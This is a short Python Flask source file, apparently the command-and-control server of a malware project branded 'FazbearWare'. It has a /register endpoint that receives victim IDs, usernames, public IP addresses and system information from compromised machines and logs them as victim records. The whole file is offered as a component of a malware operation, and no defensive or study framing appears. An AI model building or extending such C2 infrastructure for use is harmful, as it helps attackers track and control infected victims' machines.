"""
C2 SERVER 
Description: 
"""
from flask import Flask,request

# APP INSTANCE
app = Flask(__name__)

# PATHS
@app.route('/')
def home():
    return "FazbearWare C2 Server"

@app.route('/register',methods=['POST'])
def victim_register():
    data = request.get_json()
    if data:

        victim = data.get("victim_ID")
        user = data.get("current_user")
        ip = data.get("public_ip")
        sys_info = data.get("system_info")

        print(f"\n[!] Endpoint detected")
        print(f"[*] -----------------------------------------")
        print(f"[+] Victim ID    : {victim}")
        print(f"[+] User Session : {user}")
        print(f"[+] Public IP    : {ip}")
        print(f"[+] System Info  : {sys_info}")
        print(f"[*] -----------------------------------------")

        return {"status": "success", "message": "ID OK"}, 200
    return {"status": "error", "message": "No data send"}, 400

    
# EXECUTE SERVER IN LOCALHOST PORT 5000)
if __name__ == '__main__':
    app.run(port=5000, debug=True)